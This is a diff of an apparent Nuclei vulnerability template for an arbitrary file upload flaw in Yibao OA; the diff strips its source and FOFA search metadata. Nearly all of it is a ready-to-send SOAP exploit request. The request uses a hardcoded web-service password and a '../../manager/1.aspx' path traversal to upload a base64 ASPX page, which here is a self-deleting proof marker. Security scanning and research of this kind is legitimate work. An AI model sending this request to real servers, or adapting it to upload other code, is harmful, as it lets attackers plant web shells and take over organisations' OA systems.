@@ -3,15 +3,11 @@ info:
   name: 易宝-oa-basicservice-任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nh5k3u7h2hld4p99'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nh5k3u7h2hld4p99
-    fofa: title="欢迎登录易宝OA系统"|| banner="易宝OA"
 http:
 - raw:
-  - "POST /WebService/BasicService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nSOAPAction: [http://tempuri.org/UploadPersonalFile](http://tempuri.org/UploadPersonalFile)\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <UploadPersonalFile xmlns=\"http://tempuri.org/\">\n      <fs>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT4KPCUKUmVzcG9uc2UuV3JpdGUoRm9ybXNBdXRoZW50aWNhdGlvbi5IYXNoUGFzc3dvcmRGb3JTdG9yaW5nSW5Db25maWdGaWxlKCJ0ZXN0MTIzIiwgIk1ENSIpKTsKU3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTsKJT4=</fs>\n      <FileName>../../manager/1.aspx</FileName>\n      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>\n    </UploadPersonalFile>\n  </soap:Body>\n</soap:Envelope>\n\n\n上传地址"
+  - "POST /WebService/BasicService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nSOAPAction: [http://tempuri.org/UploadPersonalFile](http://tempuri.org/UploadPersonalFile)\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <UploadPersonalFile xmlns=\"http://tempuri.org/\">\n      <fs>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT4KPCUKUmVzcG9uc2UuV3JpdGUoRm9ybXNBdXRoZW50aWNhdGlvbi5IYXNoUGFzc3dvcmRGb3JTdG9yaW5nSW5Db25maWdGaWxlKCJ0ZXN0MTIzIiwgIk1ENSIpKTsKU3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTsKJT4=</fs>\n      <FileName>../../manager/1.aspx</FileName>\n      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>\n    </UploadPersonalFile>\n  </soap:Body>\n</soap:Envelope>\n\n上传地址"
   redirects: false
   matchers:
   - status:
